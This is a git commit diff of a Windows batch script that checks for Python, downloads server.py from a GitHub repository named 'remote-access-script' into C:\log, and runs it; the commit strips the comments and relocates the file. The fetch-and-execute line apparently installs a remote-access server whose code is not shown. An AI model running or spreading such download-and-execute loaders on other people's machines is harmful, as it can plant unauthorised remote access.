aac7be43a5b468b37269f4c4fff6785f0182b96d
mickr309 <mickrosenau309@gmail.com>
2025-03-06 23:11:00 +0100

    Update commands.bat

--- commands.bat
+++ commands.bat
@@ -1,22 +1,15 @@
 @echo off
-:: Check if Python is installed
 where python >nul 2>nul
 if %errorlevel% neq 0 (
     echo Python is not installed. Please install Python.
     exit /b
 )
-
-:: Download the Python script from GitHub
-echo Downloading server.py from GitHub...
-curl -o server.py https://raw.githubusercontent.com/mickr309/remote-access-script/refs/heads/main/server.py
-
-:: Check if the download was successful
-if exist server.py (
+powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/mickr309/remote-access-script/refs/heads/main/server.py -OutFile C:\log\server.py"
+if exist C:\log\server.py (
     echo Python script downloaded successfully.
 ) else (
     echo Failed to download the Python script.
     exit /b
 )
-
-:: Start the Python server script
-python server.py
+echo Starting the server...
+python C:\log\server.py
